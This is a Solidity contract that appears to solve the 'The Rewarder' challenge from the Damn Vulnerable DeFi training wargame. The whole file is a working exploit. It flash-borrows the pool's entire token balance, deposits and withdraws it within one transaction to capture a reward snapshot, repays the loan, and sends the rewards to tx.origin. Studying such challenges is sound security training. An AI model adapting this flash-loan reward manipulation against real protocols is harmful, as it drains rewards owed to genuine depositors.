// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";
import "./TheRewarderPool.sol";

contract TheRewarderAttack {
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken liquidityToken;
    TheRewarderPool pool;
    RewardToken rewardToken;
    AccountingToken accountingToken;

    constructor(
        address _loaner,
        address _pool,
        address _liquidityToken,
        address _rewardToken,
        address _accountingToken
    ) {
        flashLoanerPool = FlashLoanerPool(_loaner);
        pool = TheRewarderPool(_pool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
        accountingToken = AccountingToken(_accountingToken);
    }

    function attack(uint amount) public {
        amount = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint amount) public {
        liquidityToken.approve(address(pool), type(uint).max);
        pool.deposit(amount);
        pool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(tx.origin, rewardToken.balanceOf(address(this)));
    }
}
